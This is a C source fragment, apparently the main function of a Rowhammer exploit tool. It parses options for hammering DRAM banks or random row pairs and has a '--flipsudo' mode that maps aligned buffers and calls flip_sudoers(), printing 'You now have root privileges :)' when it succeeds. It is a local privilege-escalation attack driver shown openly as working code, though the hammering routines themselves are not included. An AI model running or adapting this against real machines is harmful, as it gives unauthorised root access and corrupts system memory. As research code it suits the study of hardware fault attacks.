	{
		/* Bank selection */
		{"all",     no_argument,       	NULL, 'a'},
		{"bank",  	optional_argument,  NULL, 'b'},
		{"random",	no_argument,		NULL, 'r'},

		/* Config args */
		{"rounds",  required_argument, 	NULL, 'R'},
		{"nactiv", 	required_argument, 	NULL, 'n'},
		{"r_pairs", required_argument, 	NULL, 'p'},

		/* Extra args */
		{"print_rows",	optional_argument,  NULL, 'P'},
		{"help",		no_argument,		NULL, 'h'},
		
		/* Debug level */
		{"verbose", 	no_argument,  	NULL, 'v'},

		{"flipsudo", 	no_argument, 	NULL, 'f'},
		{0, 0, 0, 0}
	};

	opterr = 0;					// Suppressing getopt errors
	option_index = 0;			// Default option index (imp.)
	
	while((choice = getopt_long (argc, argv, "farhvb:R:n:p:P:",
					long_options, &option_index)) != 1) {	
		
		/* No arguments provided. */
		if (argc < 2) {
			printf("\nNo arguments provided. Please refer to the usage below: \n");
			print_usage();
			goto out_bad;
		}

		/* End of arguments */
		if (choice == -1){
			break;
		}

		switch (choice) {
			case 'a':
				/* Hackish way to check conflicting flags */
				if ( hammer_conf->bank_n == 0){
					printf("[ERR ] You have already selected -b (--bank) hammer mode. Conflicting args. Exiting...\n\n");
					goto out_bad;
				}
				else if (hammer_conf->random_mode != 0){
					printf("[ERR ] You have already selected -r (--random) hammer mode. Conflicting args. Exiting...\n\n");
					goto out_bad;
				}
				else {
					hammer_conf->all_banks = 1;
				}
				break;

			case 'b':
				/* Hackish way to check conflicting flags */
				if (hammer_conf->all_banks != 0){
					printf("[ERR ] You have already selected -a (--all) hammer mode. Conflicting args. Exiting...\n\n");
					goto out_bad;
				}
				else if (hammer_conf->random_mode != 0){
					printf("[ERR ] You have already selected -r (--random) hammer mode. Conflicting args. Exiting...\n\n");
					goto out_bad;
				}
				else {
					hammer_conf->bank_n = atoi(optarg);
					hammer_conf->all_banks = 0;
					hammer_conf->random_mode = 0;
				}
				break;

			case 'r':
				/* Hackish way to check conflicting flags */
				if (hammer_conf->all_banks != 0){
					printf("[ERR ] You have already selected -a (--all) hammer mode. Conflicting args. Exiting...\n\n");
					goto out_bad;
				}
				else if (hammer_conf->bank_n != -1){
					printf("[ERR ] You have already selected -b (--bank) hammer mode. Conflicting args. Exiting...\n\n");
					goto out_bad;
				}
				else {
					hammer_conf->random_mode = 1;
					hammer_conf->all_banks = 0;
				}
				break;

			case 'R':
				hammer_conf->hammering_rounds = atoi(optarg);
				break;

			case 'n':
				hammer_conf->num_row_activations = atof(optarg) * 1000000;
				break;

			case 'p':
				hammer_conf->random_pairs = atoi(optarg);
				hammer_conf->random_mode = 1;
				break;

			case 'P':
				hammer_conf->print_rows = 1;
				if (optarg) {
					hammer_conf->bank_n = atoi(optarg);
				}
				break;

			case 'h':
				print_help();
				return 0;

			case 'v':
				hammer_conf->verbose = 1;
				break;
			
			case 'f':
			hammer_conf->flip = 1;
				break;

			case '?':
				
				if (optopt == 'b' || optopt == 'P'){
					/* Hackish way to check conflicting flags */
					if (hammer_conf->all_banks != 0){
						printf("[ERR ] You have already selected -a (--all) hammer mode. Conflicting args. Exiting...\n\n");
						goto out_bad;
					}
					else if (hammer_conf->random_mode != 0){
						printf("[ERR ] You have already selected -r (--random) hammer mode. Conflicting args. Exiting...\n\n");
						goto out_bad;
					}
					else {
						/* -b/-p without value doesn't fill optarg. 
							Need this hack unfortunately. */
						printf("\n[WARN] -%c (--%s) flag usually requires an argument.\n", 
								optopt, retrieve_arg_index(optopt, long_options));
						printf("[WARN] Proceeding with default bank - 0.\n\n");
						hammer_conf->bank_n = 0;
						break;
					}
				}
				else if (optopt == 'R' || optopt == 'n' || optopt == 'p') {
					/* Required flag provided with no value. */
					printf("The -%c (--%s) flag requires an argument. See usage below:\n\n",
								optopt, retrieve_arg_index(optopt, long_options));
					print_usage();
					goto out_bad;
				}
				else {
					/* For flags used other than provided.  */
					printf("Invalid argument passed. See usage below:\n");
					print_usage(); 
					goto out_bad;
				}

			default:
				printf("This should never print!!!\n");
				goto out_bad;
		}
	}

	/* Print header and config*/
	print_header(1);
	print_config();

	/* Mapping contiguous memory on 2MB boundary. */
	//addr_2mb_align = (void *) 0x200000;
	//buf = map_contiguous_buffer(addr_2mb_align);

	/* Filling buffer with similar/random data.
	 *	1. SAME_FILL   : Fills 0xFF
	 *	2. RANDOM_FILL : Fills random chars
	 */
	//fill_buffer(buf, 0, SAME_FILL);

	

	/* Decoding DRAM Config */
#ifdef CALC_DRAM_CONFIG 
	generate_dram_functions(buf);

	row_mask = row_index_sc(buf);	
	pr_info("rowmask -> %lx\n", row_mask);
#endif

	
	j = 1;

	/* Hacky logic for now */
	if(hammer_conf->flip == 1) {
		for(j = 1; j <= 20; j++){                          	
			srand(time(NULL));
			addr_2mb_align = (void *) (uintptr_t) (j * 0x200000);    	
			buff = map_contiguous_buffer(addr_2mb_align);
			pr_info("[+] Buffer %d\n", j);
			fill_buffer(buff, 0, SAME_FILL);
			add_entropy(buff);
			if(flip_sudoers(buff) == 0) {
				pr_info("You now have root privileges :)\n\n\n");
				return 0;
			}
		}
	
	}
#ifdef CALC_DRAM_CONFIG 
	else if (hammer_conf->print_rows){
		pr_info("[INFO] Priniting adjacent rows for bank: %lu", hammer_conf->bank_n);
		addr_2mb_align = (void *) (uintptr_t) (j * 0x200000);    	
		buff = map_contiguous_buffer(addr_2mb_align);
		print_bank_rows(buff, hammer_conf->bank_n);
	}
#endif
	else if (hammer_conf->all_banks && (hammer_conf->random_mode == 0)) {
		for(j = 1; j <= 20; j++){
			addr_2mb_align = (void *) (uintptr_t) (j * 0x200000);
			buff = map_contiguous_buffer(addr_2mb_align);
            fill_buffer(buff, 0, SAME_FILL);
			add_entropy(buff);
			hammer_all_banks(buff);
		}
	}
	else if ((hammer_conf->all_banks == 0) && hammer_conf->random_mode) {
		addr_2mb_align = (void *) (uintptr_t) (j * 0x200000);    	
		buff = map_contiguous_buffer(addr_2mb_align);
		hammer_rand_pairs(buff, hammer_conf->random_pairs);
	}
	else {
		addr_2mb_align = (void *) (uintptr_t) (j * 0x200000);    	
		buff = map_contiguous_buffer(addr_2mb_align);
		hammer_bank(buff, hammer_conf->bank_n);
	}

	/* Unmapping mapped memory */
	for(; j-- > 0;) {
		assert(munmap((void *) (uintptr_t)(j * 0x200000), BUFFER_SIZE) == 0);
	}
	print_header(0);
    return 0;

out_bad:
    return EXIT_FAILURE;
}
